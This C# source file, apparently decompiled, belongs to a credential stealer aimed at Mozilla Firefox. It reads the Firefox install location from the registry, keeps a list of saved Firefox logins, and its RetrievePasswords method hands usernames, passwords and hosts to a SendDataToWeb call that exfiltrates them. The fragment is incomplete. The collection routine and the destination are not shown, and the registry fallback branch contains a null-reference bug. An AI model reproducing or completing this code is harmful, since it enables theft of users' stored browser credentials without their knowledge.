using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace xoxoxo.Firefox
{
  internal class MozillaFirefox
  {
    private bool _isExists;
    private readonly List<FirefoxPassword> _credentials;

    private DirectoryInfo GetFirefoxInstallPath()
    {
      DirectoryInfo directoryInfo = null;
      RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Mozilla\\Mozilla Firefox", false);
      RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Mozilla\\Mozilla Firefox", false);
      if (registryKey1 != null)
      {
        _isExists = true;
        string[] subKeyNames = registryKey1.GetSubKeyNames();
        directoryInfo = new DirectoryInfo((string) registryKey1.OpenSubKey(subKeyNames[0]).OpenSubKey("Main").GetValue("Install Directory", null));
      }
      else if (registryKey2 != null)
      {
        _isExists = true;
        string[] subKeyNames = registryKey1.GetSubKeyNames();
        directoryInfo = new DirectoryInfo((string) registryKey1.OpenSubKey(subKeyNames[0]).OpenSubKey("Main").GetValue("Install Directory", null));
      }
      return directoryInfo;
    }

    private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
    {
      return profilePath.GetFiles(searchTerm).FirstOrDefault();
    }

    public bool IsExists()
    {
      return _isExists;
    }

    public void RetrievePasswords()
    {
      new DataHandler().SendDataToWeb(_credentials.Select(t => new Credentials(t.Username, t.Password, t.Host.ToString())).ToList());
    }
  }
}
